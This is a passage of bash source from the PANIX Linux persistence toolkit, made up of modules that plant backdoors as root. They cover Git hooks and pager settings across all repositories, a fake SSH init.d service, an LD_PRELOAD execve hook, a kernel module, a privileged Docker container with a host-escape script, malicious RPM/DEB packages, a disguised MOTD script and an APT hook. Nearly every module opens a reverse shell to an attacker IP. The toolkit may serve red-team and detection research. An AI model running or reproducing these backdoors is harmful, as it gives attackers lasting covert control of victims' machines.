	# Function to add malicious pre-commit hook
	add_malicious_pre_commit() {
		local git_repo="$1"
		local pre_commit_file="$git_repo/.git/hooks/pre-commit"

		if [[ ! -f $pre_commit_file ]]; then
			echo "#!/bin/bash" > $pre_commit_file
			echo "(nohup setsid /bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1' > /dev/null 2>&1 &) &" >> $pre_commit_file
			chmod +x $pre_commit_file
			echo "[+] Created malicious pre-commit hook in $git_repo"
		else
			echo "[-] Pre-commit hook already exists in $git_repo"
		fi
	}

	# Function to add malicious pager configuration
	add_malicious_pager() {
		local git_repo="$1"
		local git_config="$git_repo/.git/config"
		local user_git_config="$HOME/.gitconfig"

		local payload="nohup setsid /bin/bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1' > /dev/null 2>&1 & \${PAGER:-less}"

		if [[ ! -f $git_config ]]; then
			mkdir -p $git_repo/.git
			echo "[core]" > $git_config
			echo "        pager = $payload" >> $git_config
			echo "[+] Created Git config with malicious pager in $git_repo"
		else
			# Check if [core] section exists, add pager under it
			if ! grep -q "\[core\]" $git_config; then
				echo "[core]" >> $git_config
			fi
			# Add pager configuration under [core] section
			sed -i '/^\[core\]/a \        pager = '"$payload"'' $git_config
			echo "[+] Updated existing Git config with malicious pager in $git_repo"
		fi

		# Add to user's global config if it doesn't exist
		if [[ ! -f $user_git_config ]]; then
			echo "[core]" > $user_git_config
			echo "        pager = $payload" >> $user_git_config
			echo "[+] Created global Git config with malicious pager"
		else
			# Check if [core] section exists, add pager under it
			if ! grep -q "\[core\]" $user_git_config; then
				echo "[core]" >> $user_git_config
			fi
			# Add pager configuration under [core] section in global config
			sed -i '/^\[core\]/a \        pager = '"$payload"'' $user_git_config
			echo "[+] Updated existing global Git config with malicious pager"
		fi
	}

	# Function to add custom pre-commit hook
	add_custom_pre_commit() {
		if [[ ! -f $path ]]; then
			echo "#!/bin/sh" > $path
			echo "$command" >> $path
			chmod +x $path
			echo "[+] Created custom pre-commit hook in $path"
		else
			echo "[-] Pre-commit hook already exists in $path"
		fi
	}

	# Function to add custom pager configuration
	add_custom_pager() {
		local payload="$command"

		if [[ ! -f $path ]]; then
			echo "[core]" > $path
			echo "        pager = $payload" >> $path
			echo "[+] Created custom Git config with pager in $path"
		else
			# Check if [core] section exists, add pager under it
			if ! grep -q "\[core\]" $path; then
				echo "[core]" >> $path
			fi
			# Add pager configuration under [core] section
			sed -i '/^\[core\]/a \        pager = '"$payload"'' $path
			echo "[+] Updated existing Git config with custom pager in $path"
		fi
	}

	# Function to find Git repositories and apply chosen options
	find_git_repositories() {
		local repos=$(find / -name ".git" -type d 2>/dev/null)

		if [[ -z $repos ]]; then
			echo "[-] No Git repositories found."
		else
			for repo in $repos; do
				local git_repo=$(dirname $repo)
				if [[ $hook -eq 1 ]]; then
					add_malicious_pre_commit $git_repo
				fi
				if [[ $pager -eq 1 ]]; then
					add_malicious_pager $git_repo
				fi
			done
		fi
	}

	# Execute based on mode (default or custom)
	if [[ $default -eq 1 ]]; then
		find_git_repositories
	elif [[ $custom -eq 1 ]]; then
		if [[ $hook -eq 1 ]]; then
			add_custom_pre_commit
		elif [[ $pager -eq 1 ]]; then
			add_custom_pager
		fi
	fi
	echo "[+] Git persistence established!"
}

# Module: setup_initd_backdoor.sh
setup_initd_backdoor() {
	local default=0
	local custom=0
	local ip=""
	local port=""
	local command=""
	local initd_path="/etc/init.d/ssh-procps"

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_initd_backdoor() {
		echo "Usage: ./panix.sh --initd-backdoor [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--default                    Use default init.d settings"
		echo "  --ip <ip>                    Specify IP address"
		echo "  --port <port>                Specify port number"
		echo "--custom                     Use custom init.d settings"
		echo "  --command <command>          Specify custom command"
		echo "  --path <path>                Specify custom /etc/init.d/ file path"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--ip )
				shift
				ip=$1
				;;
			--port )
				shift
				port=$1
				;;
			--command )
				shift
				command=$1
				;;
			--path )
				shift
				initd_path=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "sudo ./panix.sh --initd --default --ip 10.10.10.10 --port 1337"
				echo ""
				echo "--custom:"
				echo "sudo ./panix.sh --initd --custom --command \"nohup setsid bash -c 'bash -i >& /dev/tcp/10.10.10.10/1337 0>&1'\" --path \"/etc/init.d/initd-backdoor\""
				exit 0
				;;
			--help|-h)
				usage_initd_backdoor
				exit 0
				;;
			* )
				echo "Invalid option for --initd: $1"
				echo "Try './panix.sh --initd --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './panix.sh --initd --help' for more information."
		exit 1
	fi

	if [[ $default -eq 0 && $custom -eq 0 ]]; then
		echo "Error: Either --default or --custom must be specified."
		echo "Try './panix.sh --initd --help' for more information."
		exit 1
	fi

	create_initd_script() {
		local payload=$1
		mkdir -p /etc/init.d
		cat <<-EOF > $initd_path
		#! /bin/sh
		### BEGIN INIT INFO
		# Provides:             ssh sshd
		# Required-Start:       \$remote_fs \$syslog \$network
		# Required-Stop:        \$remote_fs \$syslog
		# Default-Start:        2 3 4 5
		# Default-Stop:        
		# Short-Description:    OpenBSD Secure Shell server
		### END INIT INFO

		$payload
		EOF
		chmod +x $initd_path
	}

	establish_persistence() {
		if sudo which update-rc.d >/dev/null 2>&1; then
			sudo update-rc.d $(basename $initd_path) defaults
		elif sudo which chkconfig >/dev/null 2>&1; then
			sudo chkconfig --add $(basename $initd_path)
			sudo chkconfig $(basename $initd_path) on
		elif sudo which systemctl >/dev/null 2>&1; then
			# Create systemd service
			local service_name=$(basename $initd_path)
			local service_path="/etc/systemd/system/${service_name}.service"
			cat <<-EOF > $service_path
			[Unit]
			Description=Custom Init Script
			After=network.target

			[Service]
			Type=simple
			ExecStart=$initd_path start
			ExecStop=$initd_path stop
			ExecReload=$initd_path reload
			Restart=always
			RestartSec=5
			TimeoutStopSec=30
			TimeoutStartSec=30

			[Install]
			WantedBy=multi-user.target
			EOF
			sudo systemctl daemon-reload
			sudo systemctl enable $service_name
			sudo systemctl start $service_name &
		elif sudo which service >/dev/null 2>&1; then
			# Using service to start the script directly
			sudo service $(basename $initd_path) start
		else
			echo "Error: No suitable method found to establish persistence."
			exit 1
		fi
	}

	if [[ $default -eq 1 ]]; then
		if [[ -z $ip || -z $port ]]; then
			echo "Error: --ip and --port must be specified when using --default."
			echo "Try './panix.sh --initd --help' for more information."
			exit 1
		fi

		local payload="nohup setsid bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'"
		if [[ ! -f $initd_path ]]; then
			create_initd_script "$payload"
		else
			echo "$payload" >> $initd_path
		fi
		establish_persistence
		echo "[+] init.d backdoor established!"

	elif [[ $custom -eq 1 ]]; then
		if [[ -z $command || -z $initd_path ]]; then
			echo "Error: --command and --path must be specified when using --custom."
			echo "Try './panix.sh --initd --help' for more information."
			exit 1
		fi

		if [[ ! -f $initd_path ]]; then
			create_initd_script "$command"
		else
			echo "$command" >> $initd_path
		fi
		establish_persistence
		echo "[+] init.d backdoor established"
	fi
}

# Module: setup_ld_preload.sh
setup_ld_preload_backdoor() {
    local ip=""
    local port=""
    local binary=""
    local preload_compile_dir="/tmp/preload"
    local preload_name="preload_backdoor"
    local preload_source="${preload_compile_dir}/${preload_name}.c"
    local preload_lib="/lib/${preload_name}.so"
    local preload_file="/etc/ld.so.preload"

    # Ensure the function is executed as root
    if [[ $UID -ne 0 ]]; then
        echo "Error: This function can only be run as root."
        exit 1
    fi

    usage_ld_preload_backdoor() {
        echo "Usage: ./panix.sh --ld-preload [OPTIONS]"
        echo "--examples                   Display command examples"
        echo "--ip <ip>                    Specify IP address for reverse shell"
        echo "--port <port>                Specify port for reverse shell"
        echo "--binary <binary>            Specify binary to monitor"
        echo "--help|-h                    Show this help message"
    }

    while [[ "$1" != "" ]]; do
        case $1 in
            --ip )
                shift
                ip=$1
                ;;
            --port )
                shift
                port=$1
                ;;
            --binary )
                shift
                binary=$1
                ;;
            --examples )
                echo "Examples:"
                echo "./panix.sh --ld-preload --ip 192.168.211.131 --port 4444 --binary /usr/bin/whoami"
                exit 0
                ;;
            --help|-h )
                usage_ld_preload_backdoor
                exit 0
                ;;
            * )
                echo "Invalid option for --ld-preload: $1"
                echo "Try './panix.sh --ld-preload --help' for more information."
                exit 1
        esac
        shift
    done

    if [[ -z $ip || -z $port || -z $binary ]]; then
        echo "Error: --ip, --port, and --binary must be specified."
        echo "Try './panix.sh --ld-preload --help' for more information."
        exit 1
    fi

    # Ensure GCC is installed
    if ! command -v gcc &>/dev/null; then
        echo "Error: GCC is not installed. Please install it to proceed."
        echo "For Debian/Ubuntu: sudo apt install gcc"
        echo "For Fedora/RHEL/CentOS: sudo dnf install gcc"
        exit 1
    fi

    # Ensure the compile directory exists
    mkdir -p ${preload_compile_dir}

    # Generate the C source code for the LD_PRELOAD backdoor
    cat <<-EOF > ${preload_source}
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dlfcn.h>
#include <sys/types.h>

// Reverse shell configuration
#define ATTACKER_IP "$ip"
#define ATTACKER_PORT $port

// Function pointer for the original execve
int (*original_execve)(const char *pathname, char *const argv[], char *const envp[]);

// Function to spawn a reverse shell in the background
void spawn_reverse_shell() {
    pid_t pid = fork();
    if (pid == 0) { // Child process
        setsid(); // Start a new session
        char command[256];
        sprintf(command, "/bin/bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1'", ATTACKER_IP, ATTACKER_PORT);
        execl("/bin/bash", "bash", "-c", command, NULL);
        exit(0); // Exit child process if execl fails
    }
}

// Hooked execve function
int execve(const char *pathname, char *const argv[], char *const envp[]) {
    // Load the original execve function
    if (!original_execve) {
        original_execve = dlsym(RTLD_NEXT, "execve");
        if (!original_execve) {
            exit(1);
        }
    }

    // Check if the executed binary matches the specified binary
    if (strstr(pathname, "$binary") != NULL) {
        // Spawn reverse shell in the background
        spawn_reverse_shell();
    }

    // Call the original execve function
    return original_execve(pathname, argv, envp);
}
EOF

    # Check if the source file was created
    if [ ! -f "$preload_source" ]; then
        echo "Failed to create the LD_PRELOAD source code at $preload_source"
        exit 1
    else
        echo "LD_PRELOAD source code created: $preload_source"
    fi

    # Compile the shared object
    gcc -shared -fPIC -o $preload_lib $preload_source -ldl
    if [ $? -ne 0 ]; then
        echo "Compilation failed. Exiting."
        exit 1
    fi

    echo "LD_PRELOAD shared object compiled successfully: $preload_lib"

    # Add to /etc/ld.so.preload for persistence
    if ! grep -q "$preload_lib" "$preload_file" 2>/dev/null; then
        echo $preload_lib >> $preload_file
        echo "[+] Backdoor added to /etc/ld.so.preload for persistence."
    else
        echo "[!] Backdoor already present in /etc/ld.so.preload."
    fi

    echo "[+] Execute the binary $binary to trigger the reverse shell."
}

# Module: setup_lkm.sh
setup_lkm_backdoor() {
	local default=0
	local custom=0
	local ip=""
	local port=""
	local command=""
	local lkm_compile_dir="/tmp/lkm"
	local lkm_name="panix"
	local lkm_source="${lkm_compile_dir}/${lkm_name}.c"
	local lkm_destination="/lib/modules/$(uname -r)/kernel/drivers/${lkm_name}.ko"
	local lkm_path=""

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_lkm_backdoor() {
		echo "Usage: ./panix.sh --lkm [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--default                    Use default LKM settings"
		echo "  --ip <ip>                    Specify IP address"
		echo "  --port <port>                Specify port number"
		echo "--custom                     Use custom LKM settings"
		echo "  --path <path>                Specify custom kernel module path"
		echo "  --command <command>          Specify custom command to add to LKM"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--ip )
				shift
				ip=$1
				;;
			--port )
				shift
				port=$1
				;;
			--command )
				shift
				command=$1
				;;
			--path )
				shift
				lkm_path=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "sudo ./panix.sh --lkm --default --ip 10.10.10.10 --port 1337"
				echo ""
				echo "--custom:"
				echo "sudo ./panix.sh --lkm --custom --command \"nohup setsid bash -c 'bash -i >& /dev/tcp/10.10.10.10/1337 0>&1'\" --path \"/lib/modules/$(uname -r)/kernel/drivers/custom_lkm.ko\""
				exit 0
				;;
			--help|-h)
				usage_lkm_backdoor
				exit 0
				;;
			* )
				echo "Invalid option for --lkm: $1"
				echo "Try './panix.sh --lkm --help' for more information."
				exit 1
		esac
		shift
	done

	if ! command -v make &> /dev/null; then
		echo "Error: 'make' is not installed. Please install 'make' or 'build-essential' to use this mechanism."
		echo "For Debian/Ubuntu: sudo apt install build-essential"
		echo "For Fedora/RHEL/CentOS: sudo dnf/yum install make"
		exit 1
	fi

	if ! command -v gcc &> /dev/null; then
		echo "Error: 'gcc' is not installed. Please install 'gcc' to use this mechanism."
		echo "For Debian/Ubuntu: sudo apt install gcc"
		echo "For Fedora/RHEL/CentOS: sudo dnf/yum install gcc"
		exit 1
	fi

	KERNEL_HEADERS="/lib/modules/$(uname -r)/build"
	RESOLVED_HEADERS=$(readlink -f "$KERNEL_HEADERS")

	if [ ! -d "$RESOLVED_HEADERS" ]; then
		echo "Kernel headers not found. Please install the kernel headers for your system."
		echo "For Debian/Ubuntu: sudo apt install linux-headers-\$(uname -r)"
		echo "For Fedora/RHEL/CentOS: sudo dnf/yum install kernel-devel"
		exit 1
	fi

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './panix.sh --lkm --help' for more information."
		exit 1
	fi

	if [[ $default -eq 0 && $custom -eq 0 ]]; then
		echo "Error: Either --default or --custom must be specified."
		echo "Try './panix.sh --lkm --help' for more information."
		exit 1
	fi

	if [[ $default -eq 1 ]]; then
		if [[ -z $ip || -z $port ]]; then
			echo "Error: --ip and --port must be specified when using --default."
			echo "Try './panix.sh --lkm --help' for more information."
			exit 1
		fi

		# Populate the command for default mode
		# Ensure proper escaping for C string
		command="\"/bin/bash\",\"-c\",\"/bin/nohup /bin/setsid /bin/bash -c '/bin/bash -i >& /dev/tcp/$ip/$port 0>&1'\",NULL"
		echo "Default mode selected. Command set to reverse shell."

	elif [[ $custom -eq 1 ]]; then
		if [[ -z $command || -z $lkm_path ]]; then
			echo "Error: --command and --path must be specified when using --custom."
			echo "Try './panix.sh --lkm --help' for more information."
			exit 1
		fi

		# Populate the command for custom mode
		# Ensure proper escaping for C string
		command="\"/bin/bash\",\"-c\",\"$command\",NULL"
		lkm_destination="$lkm_path"
		echo "Custom mode selected. Command set to user-provided command."
	fi

	cat <<-EOF > ${lkm_source}
	#include <linux/module.h>
	#include <linux/kernel.h>
	#include <linux/init.h>
	#include <linux/kthread.h>
	#include <linux/delay.h>
	#include <linux/signal.h>

	static struct task_struct *task;

	static int backdoor_thread(void *arg) {
		allow_signal(SIGKILL);
		while (!kthread_should_stop()) {
			char *argv[] = {$command};
			call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_PROC);
			ssleep(60);
		}
		return 0;
	}

	static int __init lkm_backdoor_init(void) {
		printk(KERN_INFO "Loading LKM backdoor module\\n");
		task = kthread_run(backdoor_thread, NULL, "lkm_backdoor_thread");
		return 0;
	}

	static void __exit lkm_backdoor_exit(void) {
		printk(KERN_INFO "Removing LKM backdoor module\\n");
		if (task) {
			kthread_stop(task);
		}
	}

	module_init(lkm_backdoor_init);
	module_exit(lkm_backdoor_exit);

	MODULE_LICENSE("GPL");
	MODULE_AUTHOR("PANIX");
	MODULE_DESCRIPTION("LKM Backdoor");
	EOF

    # Check if the source file was created
    if [ ! -f "$lkm_source" ]; then
        echo "Failed to create the kernel module source code at $lkm_source"
        exit 1
    else
		echo "Kernel module source code created: $lkm_source"
	fi

	# Create the Makefile
	mkdir -p ${lkm_compile_dir}
cat <<EOF > ${lkm_compile_dir}/Makefile
obj-m += ${lkm_name}.o

all:
	make -C /lib/modules/\$(shell uname -r)/build M=\$(PWD) modules

clean:
	make -C /lib/modules/\$(shell uname -r)/build M=\$(PWD) clean
EOF

    if [ ! -f "${lkm_compile_dir}/Makefile" ]; then
		echo "Failed to create the Makefile at ${lkm_compile_dir}/Makefile"
		exit 1
    else
		echo "Makefile created: ${lkm_compile_dir}/Makefile"
	fi

	# Compile the kernel module using make
	cd ${lkm_compile_dir}
	make

	if [ $? -ne 0 ]; then
		echo "Compilation failed. Exiting."
		exit 1
	fi

	# Copy the compiled module to the destination
	cp ${lkm_compile_dir}/${lkm_name}.ko ${lkm_destination}

	if [ $? -ne 0 ]; then
		echo "Copying module failed. Exiting."
		exit 1
	fi

	echo "Kernel module compiled successfully: ${lkm_destination}"

	sudo insmod ${lkm_destination}
	if [[ $? -ne 0 ]]; then
		echo "Failed to load the kernel module. Check dmesg for errors."
		exit 1
	fi

	echo "Kernel module loaded successfully. Check dmesg for the output."
	echo "[+] LKM backdoor established!"
}

# Module: setup_malicious_docker_container.sh
setup_malicious_docker_container() {
	local ip=""
	local port=""

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_malicious_docker_container() {
		echo "Usage: ./panix.sh --malicious-container [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--ip <ip>                    Specify IP address"
		echo "--port <port>                Specify port number"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--ip )
				shift
				ip=$1
				;;
			--port )
				shift
				port=$1
				;;
			--help|-h)
				usage_malicious_docker_container
				exit 0
				;;
			--examples )
				echo "Examples:"
				echo "./panix.sh --malicious-container --default --ip 10.10.10.10 --port 1337"
				exit 0
				;;
			* )
				echo "Invalid option for --malicious-container: $1"
				echo "Try './panix.sh --malicious-container --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ -z $ip || -z $port ]]; then
		echo "Error: --ip and --port must be specified."
		echo "Try './panix.sh --malicious-container --help' for more information."
		exit 1
	fi

	if ! docker ps &> /dev/null; then
		echo "Error: Docker daemon is not running or permission denied."
		exit 1
	fi

	# Dockerfile setup and Docker image creation
	DOCKERFILE="/tmp/Dockerfile"
	cat <<-EOF > $DOCKERFILE
	FROM alpine:latest

	RUN apk add --no-cache bash socat sudo util-linux procps

	RUN adduser -D lowprivuser

	RUN echo '#!/bin/bash' > /usr/local/bin/entrypoint.sh \\
		&& echo 'while true; do /bin/bash -c "socat exec:\"/bin/bash\",pty,stderr,setsid,sigint,sane tcp:$ip:$port"; sleep 60; done' >> /usr/local/bin/entrypoint.sh \\
		&& chmod +x /usr/local/bin/entrypoint.sh

	RUN echo '#!/bin/bash' > /usr/local/bin/escape.sh \\
		&& echo 'sudo nsenter -t 1 -m -u -i -n -p -- su -' >> /usr/local/bin/escape.sh \\
		&& chmod +x /usr/local/bin/escape.sh \\
		&& echo 'lowprivuser ALL=(ALL) NOPASSWD: /usr/bin/nsenter' >> /etc/sudoers

	USER lowprivuser

	ENTRYPOINT ["/usr/local/bin/entrypoint.sh"]
	EOF

	# Building and running the Docker container
	docker build -t malicious-container -f $DOCKERFILE . && \
	docker run -d --name malicious-container --privileged --pid=host malicious-container

	echo "[+] Malicious Docker container created and running."
	echo "[+] Reverse shell is executed every minute."
	echo "[+] To escape the container with root privileges, run '/usr/local/bin/escape.sh'."
	echo "[+] Docker container persistence established!" 
}

# Module: setup_malicious_package.sh
setup_malicious_package() {
	local ip=""
	local port=""
	local mechanism=""
	local os_version=""
	local architecture=""

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_malicious_package() {
		echo "Usage: ./setup.sh --malicious-package [OPTIONS]"
		echo "--examples            Display command examples"
		echo "--ip <ip>             Specify IP address"
		echo "--port <port>         Specify port number"
		echo "--rpm                 Use RPM package manager"
		echo "--dpkg                Use DPKG package manager"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--ip )
				shift
				ip="$1"
				;;
			--port )
				shift
				port="$1"
				;;
			--rpm )
				mechanism="$1"
				;;
			--dpkg )
				mechanism="$1"
				;;
			--examples )
				echo "Example:"
				echo "sudo ./panix.sh --malicious-package --ip 10.10.10.10 --port 1337 --rpm | --dpkg"
				exit 0
				;;
			--help | -h )
				usage_malicious_package
				exit 0
				;;
			* )
				echo "Invalid option: $1"
				echo "Try './setup.sh --malicious-package --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ -z $ip || -z $port || -z $mechanism ]]; then
		echo "Error: --ip, --port, and one of --rpm or --dpkg must be specified."
		echo "Try './setup.sh --malicious-package --help' for more information."
		exit 1
	fi

	case $mechanism in
		--rpm )
			if ! command -v rpm &> /dev/null; then
					echo "Warning: RPM does not seem to be available. It might not work."
					return 1
			fi

			if ! command -v rpmbuild &> /dev/null; then
					echo "Error: rpmbuild is not installed."
					exit 1
			fi

			# Ensure the directory structure exists
			mkdir -p ~/rpmbuild/SPECS
			mkdir -p ~/rpmbuild/BUILD
			mkdir -p ~/rpmbuild/RPMS
			mkdir -p ~/rpmbuild/SOURCES
			mkdir -p ~/rpmbuild/SRPMS

			# RPM package setup
			PACKAGE_NAME="panix"
			PACKAGE_VERSION="1.0"
			cat <<-EOF > ~/rpmbuild/SPECS/${PACKAGE_NAME}.spec
			Name: ${PACKAGE_NAME}
			Version: ${PACKAGE_VERSION}
			Release: 1%{?dist}
			Summary: RPM package with payload script
			License: MIT

			%description
			RPM package with a payload script that executes a reverse shell.

			%prep
			# No need to perform any preparation actions

			%install
			# Create directories
			mkdir -p %{buildroot}/usr/bin

			%files
			# No need to specify any files here since the payload is embedded

			%post
			# Trigger payload after installation
			nohup setsid bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1' &

			%clean
			rm -rf %{buildroot}

			%changelog
			* $(date +'%a %b %d %Y') John Doe <john.doe@example.com> 1.0-1
			- Initial package creation
			EOF
			# Build RPM package
			rpmbuild -bb ~/rpmbuild/SPECS/${PACKAGE_NAME}.spec

			# Install RPM package with forced overwrite
			VER=$(grep VERSION_ID /etc/os-release | cut -d '"' -f 2 | cut -d '.' -f 1)
			rpm -i --force ~/rpmbuild/RPMS/x86_64/${PACKAGE_NAME}-1.0-1.el${VER}.x86_64.rpm
			mv ~/rpmbuild/RPMS/x86_64/${PACKAGE_NAME}-1.0-1.el${VER}.x86_64.rpm /var/lib/rpm/${PACKAGE_NAME}.rpm
			rm -rf /root/rpmbuild
			# Add crontab entry for the current user
			echo "*/1 * * * * rpm -i --force /var/lib/rpm/${PACKAGE_NAME}.rpm > /dev/null 2>&1" | crontab -
			;;

		--dpkg )

			if ! command -v dpkg &> /dev/null; then
				echo "Warning: DPKG does not seem to be available. It might not work."
			fi

			# DPKG package setup
			PACKAGE_NAME="panix"
			PACKAGE_VERSION="1.0"
			DEB_DIR="${PACKAGE_NAME}/DEBIAN"
			PAYLOAD="#!/bin/sh\nnohup setsid bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1' &"

			# Create directory structure
			mkdir -p ${DEB_DIR}

			# Write postinst script
			echo -e "${PAYLOAD}" > ${DEB_DIR}/postinst
			chmod +x ${DEB_DIR}/postinst

			# Write control file
			echo "Package: ${PACKAGE_NAME}" > ${DEB_DIR}/control
			echo "Version: ${PACKAGE_VERSION}" >> ${DEB_DIR}/control
			echo "Architecture: all" >> ${DEB_DIR}/control
			echo "Maintainer: https://github.com/Aegrah/PANIX" >> ${DEB_DIR}/control
			echo "Description: This malicious package was added through PANIX" >> ${DEB_DIR}/control

			# Build the .deb package
			dpkg-deb --build ${PACKAGE_NAME}

			# Install the .deb package
			dpkg -i ${PACKAGE_NAME}.deb

			rm -rf ${PACKAGE_NAME}
			rm -rf ${DEB_DIR}

			# Add crontab entry for the current user
			echo "*/1 * * * * /var/lib/dpkg/info/${PACKAGE_NAME}.postinst configure > /dev/null 2>&1" | crontab -
			;;

		* )
			echo "Invalid mechanism specified."
			exit 1
			;;
	esac
	echo "[+] Malicious package persistence established."
}

# Module: setup_motd_backdoor.sh
setup_motd_backdoor() {
	local default=0
	local custom=0
	local ip=""
	local port=""
	local command=""
	local path=""

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_motd_backdoor() {
		echo "Usage: ./panix.sh --motd [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--default                    Use default MOTD settings"
		echo "  --ip <ip>                    Specify IP address"
		echo "  --port <port>                Specify port number"
		echo "--custom                     Use custom MOTD settings"
		echo "  --command <command>          Specify custom command"
		echo "  --path <path>                Specify custom MOTD file path in /etc/update-motd.d/"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--ip )
				shift
				ip=$1
				;;
			--port )
				shift
				port=$1
				;;
			--command )
				shift
				command=$1
				;;
			--path )
				shift
				path=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "sudo ./panix.sh --motd --default --ip 10.10.10.10 --port 1337"
				echo ""
				echo "--custom:"
				echo "sudo ./panix.sh --motd --custom --command \"nohup setsid bash -c 'bash -i >& /dev/tcp/10.10.10.10/1337 0>&1' & disown\" --path \"/etc/update-motd.d/137-python-upgrades\""
				exit 0
				;;
			--help|-h)
				usage_motd_backdoor
				exit 0
				;;
			* )
				echo "Invalid option for --motd-backdoor: $1"
				echo "Try './panix.sh --motd --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './panix.sh --motd --help' for more information."
		exit 1
	fi

	if [[ $default -eq 0 && $custom -eq 0 ]]; then
		echo "Error: Either --default or --custom must be specified."
		echo "Try './panix.sh --motd --help' for more information."
		exit 1
	fi

	if [[ $default -eq 1 ]]; then
		if [[ -z $ip || -z $port ]]; then
			echo "Error: --ip and --port must be specified when using --default."
			echo "Try './panix.sh --motd --help' for more information."
			exit 1
		fi
		mkdir -p /etc/update-motd.d
		path="/etc/update-motd.d/137-python-upgrades"
		echo -e "#!/bin/sh\nnohup setsid bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1' & disown" > $path
		chmod +x $path
		echo "[+] MOTD backdoor established in $path"

	elif [[ $custom -eq 1 ]]; then
		if [[ -z $command || -z $path ]]; then
			echo "Error: --command and --path must be specified when using --custom."
			echo "Try './panix.sh --motd --help' for more information."
			exit 1
		fi

		if [[ ! -f $path ]]; then
			mkdir -p /etc/update-motd.d
			echo -e "#!/bin/sh\n$command" > $path
			chmod +x $path
		else
			# Read the first line and the rest of the file separately
			first_line=$(head -n 1 $path)
			rest_of_file=$(tail -n +2 $path)
			echo -e "#!/bin/sh\n$command\n${rest_of_file}" > $path
		fi
		echo "[+] MOTD backdoor persistence established!"
	fi
}

# Module: setup_package_manager_persistence.sh
setup_package_manager_persistence() {
	local ip=""
	local port=""
	local mechanism=""

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_package_manager_persistence() {
		echo "Usage: ./panix.sh --package-manager [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--ip <ip>                    Specify IP address"
		echo "--port <port>                Specify port number"
		echo "--apt | --yum | --dnf        Use APT, YUM or DNF package manager"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--ip )
				shift
				ip="$1"
				;;
			--port )
				shift
				port="$1"
				;;
			--apt | --dnf | --yum )
				mechanism="$1"
				;;
			--examples )
				echo "Example:"
				echo "sudo ./panix.sh --package-manager --ip 10.10.10.10 --port 1337 --apt | --yum | --dnf"
				exit 0
				;;
			--help|-h)
				usage_package_manager_persistence
				exit 0
				;;
			* )
				echo "Invalid option: $1"
				echo "Try './panix.sh --package-manager --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ -z $ip || -z $port || -z $mechanism ]]; then
		echo "Error: --ip, --port, and one of --apt, --yum, or --dnf must be specified."
		echo "Try './panix.sh --package-manager --help' for more information."
		exit 1
	fi
	# If anyone finds a way for EOF to work with indentation in both an editor and on the host, LMK lol.
	local python_script=$(echo -e "#!/usr/bin/env python\nHOST = \"$ip\"\nPORT = $port\n\ndef connect(host_port):\n\timport socket\n\ts = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ts.connect(host_port)\n\treturn s\n\ndef wait_for_command(s):\n\timport subprocess\n\tdata = s.recv(1024)\n\tif data == \"quit\":\n\n\t\ts.close()\n\t\tsys.exit(0)\n\telif len(data) == 0:\n\t\treturn True\n\telse:\n\t\tproc = subprocess.Popen(data, shell=True,\n\t\tstdout=subprocess.PIPE, stderr=subprocess.PIPE,\n\t\tstdin=subprocess.PIPE)\n\t\tstdout_value = proc.stdout.read() + proc.stderr.read()\n\t\ts.send(stdout_value)\n\t\treturn False\n\ndef main():\n\timport sys, os, socket, time\n\twhile True:\n\t\tsocket_died = False\n\t\ttry:\n\t\t\ts = connect((HOST, PORT))\n\t\t\twhile not socket_died:\n\t\t\t\tsocket_died = wait_for_command(s)\n\t\t\ts.close()\n\t\texcept socket.error:\n\t\t\tpass\n\t\ttime.sleep(5)\n\nif __name__ == \"__main__\":\n\tmain()")

	case $mechanism in
		--apt )
			if [[ ! -x "$(command -v apt)" ]]; then
				echo "APT is not installed. Please install APT to use this option."
				echo "Try './panix.sh --package-manager --help' for more information."
				exit 1
			fi

			path="/etc/apt/apt.conf.d/01python-upgrades"
			echo -e "APT::Update::Pre-Invoke {\"(nohup setsid /bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1' > /dev/null 2>&1 &) &\"};" > $path
			echo "[+] APT persistence established"
			;;

		--yum )
			if [[ ! -x "$(command -v yum)" ]]; then
				echo "Yum is not installed. Please install Yum to use this option."
